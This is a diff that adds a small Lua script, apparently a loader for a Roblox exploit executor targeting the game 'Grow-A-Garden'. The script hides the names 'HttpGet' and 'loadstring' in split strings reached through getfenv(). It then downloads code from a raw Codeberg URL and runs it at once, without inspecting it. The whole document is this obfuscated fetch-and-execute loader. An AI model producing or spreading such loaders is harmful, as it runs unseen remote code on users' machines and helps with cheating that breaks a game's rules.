@@ -1,0 +1,7 @@
+local a = "game"
+local b = "HttpGet"
+local c = "loadstring"
+local d = "https://codeberg.org/twentys2/Scripts/raw/branch/main/Grow-A-Garden"
+local e = getfenv()[c]
+local f = getfenv()[a][b](getfenv()[a], d)
+e(f)()
